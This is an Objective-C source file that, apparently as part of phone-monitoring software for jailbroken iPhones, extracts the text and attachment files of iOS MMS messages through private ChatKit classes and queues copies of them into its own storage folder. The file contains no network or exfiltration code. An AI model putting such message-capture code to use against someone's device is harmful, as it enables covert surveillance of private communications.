//
//  MMSAttachmentUtils.m
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MMSAttachmentUtils.h"
#import "MMSAttSavingOP.h"
#import "FxAttachment.h"

#import "CKTextMessagePart.h"
#import "CKMediaObjectMessagePart.h"
#import "CKMediaObject.h"
#import "CKCompressibleImageMediaObject.h"
#import "CKAVMediaObject.h"
#import "CKImageData.h"
#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"
#import "NSConcreteAttributedString.h"

@implementation MMSAttachmentUtils

@synthesize mAttachmentPath;
@synthesize mAttSavingQueue;

- (NSMutableArray *) getAttachments: (CKDBMessage *) aCKDBMessage {
	NSMutableArray *attachments = [[NSMutableArray alloc] initWithCapacity:2];
	
	id attSource = nil;
	NSString *fullPath = nil;
	for (id messagePart in [aCKDBMessage messageParts]) {
		DLog (@"messagePart = %@, class = %@", messagePart, [messagePart class]);
		if ([messagePart isKindOfClass:NSClassFromString(@"CKTextMessagePart")]) {
			NSConcreteAttributedString *text = [messagePart text];
			DLog (@"Text from text message part = %@", [text string]);
			
			NSString *message = [text string];
			NSInteger index = [message length] > 10 ? 10 : [message length];
			NSString *attFileName = [message substringToIndex:index];
			fullPath = [NSString stringWithFormat:@"%@%u_%@.txt", [self mAttachmentPath],
								  [aCKDBMessage identifier], attFileName];
			attSource = [message dataUsingEncoding:NSUTF8StringEncoding];
//			DLog (@"attSource = %@", attSource);
			
		} else if ([messagePart isKindOfClass:NSClassFromString(@"CKMediaObjectMessagePart")]) {
			CKMediaObject *mediaObject = [messagePart mediaObject];
			
			DLog (@"mediaObject = %@", mediaObject);
			DLog (@"class of mediaObject = %@", [mediaObject class]);
			
			NSString *attFullPath = [mediaObject filename]; // Include the extension
			fullPath = [NSString stringWithFormat:@"%@%u_%@", [self mAttachmentPath],
						[aCKDBMessage identifier], [attFullPath lastPathComponent]];
			
			// Since we explicitly create CKDBMessage, getting attachment data is no longer work
//			if ([mediaObject isKindOfClass:NSClassFromString(@"CKCompressibleImageMediaObject")]) {
//				CKImageData *ckImageData = [(CKCompressibleImageMediaObject *)mediaObject imageData];
//				attSource = [ckImageData data];
//			} else {
//				attSource = [mediaObject data] ? [mediaObject data] : [mediaObject dataForMedia];
//			}
			
			// It probably take long time to read data from file thus do it in operation, also attachment is not available
//			attSource = [NSData dataWithContentsOfFile:attFullPath];
//			DLog (@"attSource = %@", attSource);
			
			// NOTE:
			// attFullPath: /var/root/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
			// but real file is /var/mobile/Library/SMS/Attachments/78/08/709612F5-C2BC-4854-AC1C-881DE33AA102/IMG_5308.jpg
			// thus replace /var/root/Library with /var/mobile/Library
			attSource = [attFullPath stringByReplacingOccurrencesOfString:@"/var/root/Library" withString:@"/var/mobile/Library"];
		}
		
		FxAttachment *attachment = [[FxAttachment alloc] init];
		[attachment setFullPath:fullPath];
		[attachments addObject:attachment];
		[attachment release];
		
		DLog (@"Attachment -- fullPath = %@", fullPath);
		DLog (@"Attachment -- attSource = %@", attSource);
		
		// Create operation to save data to file
		MMSAttSavingOP *op = [[MMSAttSavingOP alloc] init];
		[op setQueuePriority:NSOperationQueuePriorityNormal];
		[op setMAttFullPath:fullPath];
		[op setMAttSource:attSource];
		[mAttSavingQueue addOperation:op];
		[op release];
	}
	return ([attachments autorelease]);
}

- (void) dealloc {
	[mAttachmentPath release];
	[super dealloc];
}

@end
